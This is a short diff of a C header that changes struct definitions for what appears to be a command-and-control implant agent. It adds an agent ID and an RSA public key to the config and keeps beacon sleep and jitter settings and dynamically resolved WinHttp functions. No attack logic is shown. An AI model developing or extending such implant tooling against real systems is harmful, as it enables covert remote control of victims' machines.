@@ -55,6 +55,9 @@ typedef struct _AgentConfig {
 	UINT32 WorkingHours;
 	UINT32 SleepTime;
 	UINT32 SleepJitter;
+	DWORD AgentID;
+	BYTE* RSAPubKey;
+	DWORD RSAPubKeySize;
 	ListenerConfig listenerConfig;
 
 } AgentConfig, *PAgentConfig;
@@ -103,10 +106,6 @@ typedef struct _Agent {
 	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
 	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
 	t_WinHttpSetOption pWinHttpSetOption;
-
-	//agent metadata
-	UINT32 AgentID;
-	char EndPoint[256];
 
 	//agent configuration
 	PAgentConfig config;
